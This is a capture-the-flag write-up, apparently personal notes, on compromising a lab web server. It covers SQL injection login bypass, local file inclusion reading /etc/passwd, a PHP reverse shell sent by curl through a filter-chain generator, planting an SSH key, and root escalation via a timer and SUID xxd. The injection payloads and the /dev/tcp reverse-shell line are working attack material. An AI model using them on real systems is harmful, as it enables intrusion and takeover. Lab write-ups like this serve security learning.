This CTF contains a port scanning "block" method, since it show a lot of open ports in which most of services, are unavailable, for our luck, port 80 is open and has a login page:

I tried different things such as `XSS` `LFI` `PATH TRAVERSAL` `BRUTEFORCE` and more, then when i tried `SQLI` I found a path to exploit, after trying multiple payloads, got with this one that worked for me:

`' || '1'='1';-- -`

Had to URL encode it:

`%27%20%7C%7C%20%271%27%3D%271%27%3B--%20-`

And it showed the following output:

That location seems fun, lets visit it:

We got admin panel even without credentials:

After looking for a while, I found that the request for messages, got me this message:

![[Pasted image 20240927154349.png]]

Let's visit it:

![[Pasted image 20240927154523.png]]

Nothing too useful, but then, looking at the URL I thought about a `LFI`, when i sent the request, i got this:

![[Pasted image 20240927154621.png]]
I was able to read `etc/passwd` file, this website is vulnerable to `LFI`, let's get a reverse shell:

For this, i will be using the following tool:

```github
https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py`
```

Also, a simple php reverse shell, i will store it in a file called payload.txt: 

```php
"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"'); ?>" | grep "^php" > payload.txt
```

Now, let's send the reverse shell and establish a connection to our machine:

###### Sending the payload
`curl "http://10.10.142.162/secret-script.php?file=$(cat payload.txt)"`

We got our reverse shell, let's make it stable using the [[STABLE SHELL|shell tricks]]::

![[Pasted image 20240927160349.png]]
Now, we have an stable shell, let's look for privesc:

![[Pasted image 20240927160513.png]]
We cannot read user.txt contents neither use sudo -l due to the lack of the password for the user, let's look at SUID files:

![[Pasted image 20240927160551.png]]

Nothing useful too, let's keep enumerating the machine:

![[Pasted image 20240927160737.png]]
in `/home/comte/.ssh` we can read and write authorized keys, let's put ours:

![[Pasted image 20240927161025.png]]
![[Pasted image 20240927161221.png]]
I could enter ssh using my own key, let's read that `user.txt` file:

![[Pasted image 20240927161301.png]]\

For privilege escalation we have this sudo permissions:

![[Pasted image 20240927161701.png]]
When i read the `exploit.timer` file, I see this:

![[Pasted image 20240927161722.png]]
Let's change the `OnBootSec` to 5 seconds and enable the service to see what it does:

![[Pasted image 20240927161803.png]]
![[Pasted image 20240927162007.png]]
Once I did this, I found that a new binary was added to the 4000 UID binaries, let's exploit `xxd` to gain root shell:

![[Pasted image 20240927162104.png]]

![[Pasted image 20240927162740.png]]
Now, i got root authorized key access:

![[Pasted image 20240927162817.png]]
just like that, machine is done:
